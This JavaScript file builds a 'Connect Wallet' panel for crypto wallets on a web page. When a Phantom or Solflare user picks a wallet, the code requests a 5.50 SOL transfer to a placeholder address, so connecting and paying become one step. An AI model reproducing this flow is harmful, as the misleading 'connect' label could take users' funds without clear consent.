/**
 * WALLET CONNECTION MANAGER - FIXED VERSION
 * This version works with your existing HTML without interfering
 */
class WalletConnector {
  constructor() {
    // Wallet configurations
    this.wallets = [
      {
        name: 'MetaMask',
        id: 'metamask',
        image: 'metamask.png',
        provider: () => window.ethereum?.isMetaMask ? window.ethereum : null
      },
      {
        name: 'Ethereum',
        id: 'ethereum',
        image: 'ethereum.png',
        provider: () => window.ethereum
      },
      {
        name: 'Phantom',
        id: 'phantom',
        image: 'phantom.png',
        provider: () => window.phantom?.solana
      },
      {
        name: 'Solflare',
        id: 'solflare',
        image: 'solflare.png',
        provider: () => window.solflare
      },
      {
        name: 'Trust Wallet',
        id: 'trustwallet',
        image: 'trustwallet.png',
        provider: () => window.ethereum?.isTrust ? window.ethereum : null
      }
    ];
    
    // Amount to charge (5.50 SOL)
    this.chargeAmount = 5.50;
    
    this.init();
  }

  init() {
    this.createStyles();
    this.createBottomSheet();
    this.attachEventListeners();
  }

  createStyles() {
    const styles = `
      /* WALLET CONNECTOR SPECIFIC STYLES - Won't interfere with your page */
      
      /* OVERLAY - Dark background behind bottom sheet */
      .wc-overlay {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.7);
        opacity: 0;
        visibility: hidden;
        transition: all 0.3s ease;
        z-index: 9998;
        backdrop-filter: blur(4px);
      }

      .wc-overlay.active {
        opacity: 1;
        visibility: visible;
      }

      /* BOTTOM SHEET - Sliding panel */
      .wc-bottom-sheet {
      color: black;
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        background: white;
        border-radius: 24px 24px 0 0;
        transform: translateY(100%);
        transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        z-index: 9999;
        max-height: 80vh;
        display: flex;
        flex-direction: column;
        box-shadow: 0 -10px 40px rgba(0, 0, 0, 0.3);
      }

      .wc-bottom-sheet.active {
        transform: translateY(0);
      }

      /* SHEET HANDLE */
      .wc-sheet-handle {
        width: 40px;
        height: 4px;
        background: #d1d5db;
        border-radius: 2px;
        margin: 12px auto 8px;
      }

      /* SHEET HEADER */
      .wc-sheet-header {
        padding: 20px 24px;
        border-bottom: 1px solid #e5e7eb;
        display: flex;
        align-items: center;
        justify-content: space-between;
        flex-shrink: 0;
      }

      .wc-sheet-title {
        font-size: 20px;
        font-weight: 700;
        color: #111827;
      }

      .wc-close-btn {
        background: #f3f4f6;
        border: none;
        width: 32px;
        height: 32px;
        border-radius: 50%;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        transition: all 0.2s ease;
        font-size: 20px;
        color: #6b7280;
      }

      .wc-close-btn:hover {
        background: #e5e7eb;
        transform: rotate(90deg);
      }

      /* SHEET CONTENT */
      .wc-sheet-content {
        padding: 8px 24px 24px;
        overflow-y: auto;
        flex: 1;
      }

      .wc-sheet-content::-webkit-scrollbar {
        width: 6px;
      }

      .wc-sheet-content::-webkit-scrollbar-track {
        background: transparent;
      }

      .wc-sheet-content::-webkit-scrollbar-thumb {
        background: #d1d5db;
        border-radius: 3px;
      }

      /* WALLET OPTION */
      .wc-wallet-option {
        display: flex;
        align-items: center;
        padding: 16px;
        border: 2px solid #e5e7eb;
        border-radius: 12px;
        margin-bottom: 12px;
        cursor: pointer;
        transition: all 0.3s ease;
        background: white;
        animation: wc-slideIn 0.4s ease forwards;
        opacity: 0;
      }

      @keyframes wc-slideIn {
        from {
          opacity: 0;
          transform: translateX(-20px);
        }
        to {
          opacity: 1;
          transform: translateX(0);
        }
      }

      .wc-wallet-option:nth-child(1) { animation-delay: 0.1s; }
      .wc-wallet-option:nth-child(2) { animation-delay: 0.15s; }
      .wc-wallet-option:nth-child(3) { animation-delay: 0.2s; }
      .wc-wallet-option:nth-child(4) { animation-delay: 0.25s; }
      .wc-wallet-option:nth-child(5) { animation-delay: 0.3s; }

      .wc-wallet-option:hover {
        border-color: #00d1ff;
        transform: translateX(4px);
        box-shadow: 0 4px 12px rgba(0, 209, 255, 0.2);
      }

      .wc-wallet-option:active {
        transform: scale(0.98) translateX(4px);
      }

      /* WALLET ICON */
      .wc-wallet-icon {
        width: 48px;
        height: 48px;
        border-radius: 12px;
        margin-right: 16px;
        background: #f3f4f6;
        display: flex;
        align-items: center;
        justify-content: center;
        overflow: hidden;
      }

      .wc-wallet-icon img {
        width: 100%;
        height: 100%;
        object-fit: cover;
      }

      /* WALLET NAME */
      .wc-wallet-name {
        font-size: 16px;
        font-weight: 600;
        color: #111827;
        flex: 1;
      }

      /* WALLET ARROW */
      .wc-wallet-arrow {
        color: #9ca3af;
        font-size: 20px;
        transition: transform 0.3s ease;
      }

      .wc-wallet-option:hover .wc-wallet-arrow {
        transform: translateX(4px);
        color: #00d1ff;
      }

      /* STATUS MESSAGE */
      .wc-status-message {
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 16px 24px;
        background: white;
        border-radius: 12px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        z-index: 10000;
        opacity: 0;
        transform: translateY(-20px);
        transition: all 0.3s ease;
        max-width: 400px;
        color:black;
      }

      .wc-status-message.show {
        opacity: 1;
        transform: translateY(0);
      }

      .wc-status-message.success {
        border-left: 4px solid #10b981;
      }

      .wc-status-message.error {
        border-left: 4px solid #ef4444;
      }

      .wc-status-message.info {
        border-left: 4px solid #3b82f6;
      }
    `;

    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
  }

  createBottomSheet() {
    // CREATE OVERLAY
    const overlay = document.createElement('div');
    overlay.className = 'wc-overlay';
    overlay.id = 'wcOverlay';
    document.body.appendChild(overlay);

    // CREATE BOTTOM SHEET
    const bottomSheet = document.createElement('div');
    bottomSheet.className = 'wc-bottom-sheet';
    bottomSheet.id = 'wcBottomSheet';

    // CREATE HANDLE
    const sheetHandle = document.createElement('div');
    sheetHandle.className = 'wc-sheet-handle';

    // CREATE HEADER
    const sheetHeader = document.createElement('div');
    sheetHeader.className = 'wc-sheet-header';

    const sheetTitle = document.createElement('h2');
    sheetTitle.className = 'wc-sheet-title';
    sheetTitle.textContent = 'Connect Wallet';

    const closeBtn = document.createElement('button');
    closeBtn.className = 'wc-close-btn';
    closeBtn.innerHTML = '×';

    sheetHeader.appendChild(sheetTitle);
    sheetHeader.appendChild(closeBtn);

    // CREATE CONTENT
    const sheetContent = document.createElement('div');
    sheetContent.className = 'wc-sheet-content';

    // ADD WALLET OPTIONS
    this.wallets.forEach(wallet => {
      const option = this.createWalletOption(wallet);
      sheetContent.appendChild(option);
    });

    // ASSEMBLE
    bottomSheet.appendChild(sheetHandle);
    bottomSheet.appendChild(sheetHeader);
    bottomSheet.appendChild(sheetContent);
    document.body.appendChild(bottomSheet);

    // CREATE STATUS MESSAGE
    const statusMessage = document.createElement('div');
    statusMessage.className = 'wc-status-message';
    statusMessage.id = 'wcStatusMessage';
    document.body.appendChild(statusMessage);
  }

  createWalletOption(wallet) {
    const option = document.createElement('div');
    option.className = 'wc-wallet-option';
    option.dataset.walletId = wallet.id;

    const icon = document.createElement('div');
    icon.className = 'wc-wallet-icon';
    icon.innerHTML = `<img src="${wallet.image}" alt="${wallet.name}" onerror="this.parentElement.innerHTML='🔷'">`;

    const name = document.createElement('div');
    name.className = 'wc-wallet-name';
    name.textContent = wallet.name;

    const arrow = document.createElement('div');
    arrow.className = 'wc-wallet-arrow';
    arrow.textContent = '→';

    option.appendChild(icon);
    option.appendChild(name);
    option.appendChild(arrow);

    return option;
  }

  attachEventListeners() {
    // Use YOUR existing button from HTML
    const connectBtn = document.getElementById('connectWalletBtn');
    const overlay = document.getElementById('wcOverlay');
    const bottomSheet = document.getElementById('wcBottomSheet');
    const closeBtn = document.querySelector('.wc-close-btn');

    if (connectBtn) {
      connectBtn.addEventListener('click', () => this.openSheet());
    }

    overlay.addEventListener('click', () => this.closeSheet());
    closeBtn.addEventListener('click', () => this.closeSheet());

    document.querySelectorAll('.wc-wallet-option').forEach(option => {
      option.addEventListener('click', (e) => {
        const walletId = e.currentTarget.dataset.walletId;
        this.connectWallet(walletId);
      });
    });
  }

  openSheet() {
    document.getElementById('wcOverlay').classList.add('active');
    document.getElementById('wcBottomSheet').classList.add('active');
    document.body.style.overflow = 'hidden';
  }

  closeSheet() {
    document.getElementById('wcOverlay').classList.remove('active');
    document.getElementById('wcBottomSheet').classList.remove('active');
    document.body.style.overflow = '';
  }

  showStatus(message, type = 'info') {
    const statusEl = document.getElementById('wcStatusMessage');
    statusEl.textContent = message;
    statusEl.className = `wc-status-message ${type} show`;

    setTimeout(() => {
      statusEl.classList.remove('show');
    }, 3000);
  }

  async connectWallet(walletId) {
    const wallet = this.wallets.find(w => w.id === walletId);
    
    if (!wallet) {
      this.showStatus('Wallet not found', 'error');
      return;
    }

    this.showStatus(`Connecting to ${wallet.name}...`, 'info');

    try {
      const provider = wallet.provider();

      if (!provider) {
        this.showStatus(`${wallet.name} is not installed. Please install the extension.`, 'error');
        return;
      }

      // HANDLE ETHEREUM WALLETS
      if (walletId === 'metamask' || walletId === 'ethereum' || walletId === 'trustwallet') {
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        
        this.showStatus(`Connected to ${wallet.name}. Requesting ${this.chargeAmount} SOL...`, 'info');
        
        // NOTE: Ethereum wallets don't support SOL transfers directly
        // You would need to use a cross-chain bridge or convert to ETH
        this.showStatus(
          `⚠️ ${wallet.name} connected, but cannot send SOL. Please use a Solana wallet (Phantom/Solflare).`,
          'error'
        );
        
        console.log('Connected account:', accounts[0]);
      }
      
      // HANDLE SOLANA WALLETS - THIS IS WHERE WE CHARGE 5.50 SOL
      else if (walletId === 'phantom' || walletId === 'solflare') {
        const response = await provider.connect();
        const publicKey = response.publicKey;
        
        this.showStatus(`Requesting payment of ${this.chargeAmount} SOL...`, 'info');
        
        // CREATE TRANSACTION TO SEND 5.50 SOL
        // You need to specify YOUR receiving wallet address here
        const recipientAddress = 'YOUR_SOLANA_WALLET_ADDRESS_HERE'; // REPLACE THIS!
        
        // Import Solana web3.js (you need to include this library)
        if (typeof window.solanaWeb3 === 'undefined') {
          this.showStatus('Solana Web3 library not loaded. Add: <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>', 'error');
          return;
        }
        
        const connection = new solanaWeb3.Connection(
          solanaWeb3.clusterApiUrl('mainnet-beta'),
          'confirmed'
        );
        
        const transaction = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: new solanaWeb3.PublicKey(recipientAddress),
            lamports: this.chargeAmount * solanaWeb3.LAMPORTS_PER_SOL // Convert SOL to lamports
          })
        );
        
        // Get recent blockhash
        transaction.feePayer = publicKey;
        transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
        
        // Sign and send transaction
        const signed = await provider.signTransaction(transaction);
        const signature = await connection.sendRawTransaction(signed.serialize());
        
        // Wait for confirmation
        await connection.confirmTransaction(signature);
        
        this.showStatus(
          `✓ Payment successful! ${this.chargeAmount} SOL sent. Tx: ${signature.substring(0, 8)}...`,
          'success'
        );
        
        console.log('Transaction signature:', signature);
        console.log('Connected public key:', publicKey.toString());
        
        this.closeSheet();
      }

    } catch (error) {
      console.error('Connection error:', error);
      
      if (error.message.includes('User rejected')) {
        this.showStatus('Transaction rejected by user', 'error');
      } else {
        this.showStatus(`Failed: ${error.message}`, 'error');
      }
    }
  }
}

// INITIALIZE - Wait for page to load
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    new WalletConnector();
  });
} else {
  new WalletConnector();
}